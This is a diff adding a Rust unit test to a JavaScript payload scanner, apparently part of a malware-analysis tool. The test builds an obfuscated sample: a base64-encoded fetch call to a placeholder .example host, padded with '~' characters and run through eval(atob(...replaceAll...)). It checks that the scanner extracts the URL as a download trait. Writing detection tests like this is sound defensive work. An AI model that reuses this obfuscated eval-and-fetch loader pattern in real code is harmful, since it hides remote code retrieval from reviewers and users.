@@ -10191,6 +10191,35 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_replace_all_bound_args_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-replace-all-bound-args-js.example/p')",
+        );
+        let noisy = encoded
+            .chars()
+            .map(|ch| format!("{ch}~"))
+            .collect::<String>();
+        let js = format!(
+            r#"var marker = "~"; var empty = ""; var b = "{noisy}"; eval(atob(b.replaceAll(marker, empty)))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-replace-all-bound-args-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob replaceAll bound args payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_split_join_delimited_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
